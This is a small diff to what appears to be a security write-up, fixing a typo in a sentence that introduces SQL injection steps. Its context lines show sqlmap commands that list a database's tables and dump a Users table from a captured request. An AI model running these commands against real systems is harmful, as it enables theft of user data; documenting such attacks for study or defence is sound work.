@@ -72,7 +72,7 @@ After understanding how this database is structured, an attacker could use the f
 $ sqlmap -r postRequest.txt --tables
 ```
 
-And then retrieve sensitive information from the it:
+And then retrieve sensitive information from it:
 
 ```sh
 $ sqlmap -r postRequest.txt -D a1db -T Users --dump
